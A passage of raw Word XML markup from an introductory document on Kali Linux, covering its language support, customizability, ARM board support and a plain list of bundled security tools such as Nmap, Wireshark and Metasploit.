        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>ngu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="35"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>uppor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="35"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>sers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>opera</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="35"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ang</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>age and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hey</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">need for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>ob.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Comp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>custom</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>zab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can be cus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>zed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>requ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>sers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82" w:line="307" w:lineRule="auto"/>
        <w:ind w:left="808" w:right="72" w:hanging="284"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1020" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARMEL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="15"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>pport:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="35"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="29"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="29"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>RM-based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e-board</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ke </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>spberry Pi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>eBone</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="100" w:right="8079"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ty</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-22"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="6" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>Ka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>nux</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">udes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>kn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>wn secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="18" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rcr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ck-ng</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>et</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>reshark</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Me</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>asp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Fra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ework</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Burp su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="82"/>
        <w:ind w:left="524"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">John </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pper</w:t>
      </w:r>
    </w:p>
